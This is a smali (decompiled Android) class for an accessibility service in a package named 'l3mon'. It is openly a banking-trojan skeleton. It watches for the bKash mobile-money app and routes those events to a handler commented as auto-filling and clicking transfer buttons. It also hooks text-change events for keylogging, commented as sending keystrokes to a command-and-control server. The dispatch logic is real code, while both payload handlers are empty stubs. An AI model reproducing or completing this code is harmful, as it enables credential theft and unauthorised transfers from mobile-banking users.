.class public Lcom/etechd/l3mon/FalconAccessibilityService;
.super Landroid/accessibilityservice/AccessibilityService;

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 5
    
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v0
    if-nez v0, :cond_0
    return-void

    :cond_0
    invoke-interface {v0}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;
    move-result-object v0

    # Vector 1: bKash/Nagad Targeting
    const-string v1, "com.bKash.customerapp"
    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :cond_1
    invoke-direct {p0, p1}, Lcom/etechd/l3mon/FalconAccessibilityService;->handleBkash(Landroid/view/accessibility/AccessibilityEvent;)V
    :cond_1

    # Vector 9: Keylogging
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
    move-result v1
    const/16 v2, 0x10 # TYPE_VIEW_TEXT_CHANGED
    if-ne v1, v2, :cond_2
    invoke-direct {p0, p1}, Lcom/etechd/l3mon/FalconAccessibilityService;->logText(Landroid/view/accessibility/AccessibilityEvent;)V
    :cond_2

    return-void
.end method

.method private handleBkash(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    # Implementation for auto-filling and clicking transfer buttons
    return-void
.end method

.method private logText(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 0
    # Implementation for capturing keystrokes and sending to C2
    return-void
.end method

.method public onInterrupt()V
    .locals 0
    return-void
.end method
